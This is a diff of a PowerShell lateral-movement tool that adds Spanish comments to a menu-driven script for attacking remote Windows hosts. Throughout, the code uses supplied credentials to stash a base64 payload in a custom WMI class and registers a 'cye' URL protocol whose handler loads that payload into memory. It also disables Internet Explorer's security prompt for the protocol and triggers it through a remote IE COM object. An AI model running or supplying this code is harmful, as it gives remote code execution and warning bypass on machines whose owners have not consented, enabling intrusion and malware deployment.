@@ -12,6 +12,7 @@ function Get-Input {
     return Read-Host -Prompt $prompt
 }
 
+# Verifica y solicita las entradas del usuario si no son proporcionadas
 if (-not $remoteHost) {
     $remoteHost = Get-Input "Enter the remote host name or IP"
 }
@@ -25,61 +26,69 @@ if (-not $password) {
     $password = Get-Input "Enter the password"
 }
 
+# Función para crear un protocolo URL personalizado en el host remoto
 function Create-URLProtocol {
     param (
         [string]$remoteHost
     )
     <#
     .SYNOPSIS
-    Creates a custom URL protocol on the remote host.
+    Crea un protocolo URL personalizado en el host remoto.
     .PARAMETER remoteHost
-    The name or IP address of the remote host.
+    El nombre o dirección IP del host remoto.
     #>
-    
+
+    # Inicializa el objeto WMI en el host remoto
     $RemoteWaMI = [WMIClass] "\\$remoteHost\root\default:StdRegProv"
+
+    # Crea las claves de registro necesarias
     $RemoteWaMI.CreateKey(2137483650, "Software\Classes\cye")
     $RemoteWaMI.SetStringValue(2137483650, "Software\Classes\cye", "URL Protocol", $null)
-    
+
     $RemoteWaMI.CreateKey(2137483650, "Software\Classes\cye\shell")
     $RemoteWaMI.CreateKey(2137483650, "Software\Classes\cye\shell\open")
     $RemoteWaMI.CreateKey(2137483650, "Software\Classes\cye\shell\open\command")
-    
+
+    # Comando PowerShell para ejecutar el payload en el host remoto
     $cmd = "powershell -c `[System.Reflection.Assembly]::Load(([Convert]::FromBase64String((([WmiClass]'root\default:Win32_DataInfilClass').Properties['File'].Value))))"
     $RemoteWaMI.SetStringValue(2137483650, "Software\Classes\cye\shell\open\command", $null, $cmd)
 }
 
+# Función para invocar el protocolo URL personalizado a través de Internet Explorer
 function Invoke-URLProtocol {
     param (
         [string]$remoteHost
     )
     <#
     .SYNOPSIS
-    Invokes the custom URL protocol through Internet Explorer on the remote host.
+    Invoca el protocolo URL personalizado a través de Internet Explorer en el host remoto.
     .PARAMETER remoteHost
-    The name or IP address of the remote host.
+    El nombre o dirección IP del host remoto.
     #>
-    
+
     $ie = [System.Activator]::CreateInstance([System.Type]::GetTypeFromProgID("internetexplorer.application", "\\$remoteHost"))
     $ie.Navigate2("cye:blabla")
     $ie.Quit()
 }
 
+# Función para deshabilitar advertencias de seguridad en Internet Explorer para el protocolo personalizado
 function Disable-IEWarning {
     param (
         [string]$remoteHost
     )
     <#
     .SYNOPSIS
-    Disables the security warning for the custom URL protocol in Internet Explorer.
+    Deshabilita la advertencia de seguridad para el protocolo URL personalizado en Internet Explorer.
     .PARAMETER remoteHost
-    The name or IP address of the remote host.
+    El nombre o dirección IP del host remoto.
     #>
-    
+
     $RemoteWami = [WMIClass]"\\$remoteHost\root\default:StdRegProv"
     $RemoteWami.CreateKey(2147483651, "SID\\Software\\Microsoft\\Internet Explorer\\ProtocolExecute\\cye")
     $RemoteWami.SetDWORDValue(2147483651, "SID\\Software\\Microsoft\\Internet Explorer\\ProtocolExecute\\cye", "WarnOnOpen", 0)
 }
 
+# Función para subir y ejecutar un payload en el host remoto
 function Upload-And-ExecutePayload {
     param (
         [string]$remoteHost,
@@ -89,38 +98,44 @@ function Upload-And-ExecutePayload {
     )
     <#
     .SYNOPSIS
-    Uploads and executes a base64 encoded payload on the remote host.
+    Sube y ejecuta un payload codificado en base64 en el host remoto.
     .PARAMETER remoteHost
-    The name or IP address of the remote host.
+    El nombre o dirección IP del host remoto.
     .PARAMETER payloadPath
-    The local path of the payload to upload.
+    La ruta local del payload a subir.
     .PARAMETER username
-    The username for authentication.
+    El nombre de usuario para la autenticación.
     .PARAMETER password
-    The password for authentication.
+    La contraseña para la autenticación.
     #>
-    
+
+    # Lee y codifica el contenido del archivo en base64
     $FileBytes = [IO.File]::ReadAllBytes($payloadPath)
     $EncodedFileContent = [Convert]::ToBase64String($FileBytes)
 
+    # Configura las opciones de conexión WMI
     $Options = New-Object System.Management.ConnectionOptions
     $Options.Username = $username
     $Options.Password = $password
     $Options.EnablePrivileges = $true
 
+    # Establece la conexión WMI al host remoto
     $Connection = New-Object System.Management.ManagementScope
     $Connection.Path = "\\$remoteHost\root\default"
     $Connection.Options = $Options
     $Connection.Connect()
 
+    # Inserta el payload codificado en la clase WMI personalizada
     $DataInfilClass = New-Object System.Management.ManagementClass($Connection, [String]::Empty, $null)
     $DataInfilClass['__CLASS'] = 'Win32_DataInfilClass'
     $DataInfilClass.Properties.Add('File', [System.Management.CimType]::String, $false)
     $DataInfilClass.Properties['File'].Value = $EncodedFileContent
     $DataInfilClass.Put()
 
+    # Prepara el comando para ejecutar el payload
     $cmd = "powershell -c `[System.Reflection.Assembly]::Load((`[Convert]::FromBase64String((([WmiClass]'root\\default:Win32_DataInfilClass').Properties['File'].Value))))`"
     
+    # Crea las claves de registro para ejecutar el payload a través del protocolo URL
     $RemoteWaMI = [WMIClass]"\\$remoteHost\root\default:StdRegProv"
     $RemoteWaMI.CreateKey(2137483650, "Software\Classes\cye")
     $RemoteWaMI.SetStringValue(2137483650, "Software\Classes\cye", "URL Protocol", $null)
@@ -130,10 +145,11 @@ function Upload-And-ExecutePayload {
     $RemoteWaMI.SetStringValue(2137483650, "Software\Classes\cye\shell\open\command", $null, $cmd)
 }
 
+# Función para mostrar un menú de selección de opciones
 function Show-Menu {
     <#
     .SYNOPSIS
-    Displays a menu for user selection of options.
+    Muestra un menú para seleccionar opciones.
     #>
     Write-Host "`nSelect an option:"
     Write-Host "1. Create custom URL protocol"
@@ -143,28 +159,22 @@ function Show-Menu {
     Write-Host "5. Exit"
 }
 
+# Bucle del menú principal
 do {
     Show-Menu
     $choice = Read-Host "Enter your choice"
 
     switch ($choice) {
         1 {
-            $remoteHost = Read-Host "Enter the remote host name or IP"
             Create-URLProtocol -remoteHost $remoteHost
         }
         2 {
-            $remoteHost = Read-Host "Enter the remote host name or IP"
             Invoke-URLProtocol -remoteHost $remoteHost
         }
         3 {
-            $remoteHost = Read-Host "Enter the remote host name or IP"
             Disable-IEWarning -remoteHost $remoteHost
         }
         4 {
-            $remoteHost = Read-Host "Enter the remote host name or IP"
-            $payloadPath = Read-Host "Enter the local payload path"
-            $username = Read-Host "Enter the username"
-            $password = Read-Host "Enter the password"
             Upload-And-ExecutePayload -remoteHost $remoteHost -payloadPath $payloadPath -username $username -password $password
         }
         5 {
@@ -176,5 +186,3 @@ do {
         }
     }
 } while ($choice -ne 5)
-#.\LazyOwnEvilWMI.ps1 -remoteHost "192.168.1.100" -payloadPath "C:\Users\Argen\Downloads\my_payload.exe" -username "admin" -password "password123"
-# Thanks to the article that inspired this script :) Thanks https://blog.fndsec.net/2024/09/11/wmi-research-and-lateral-movement/
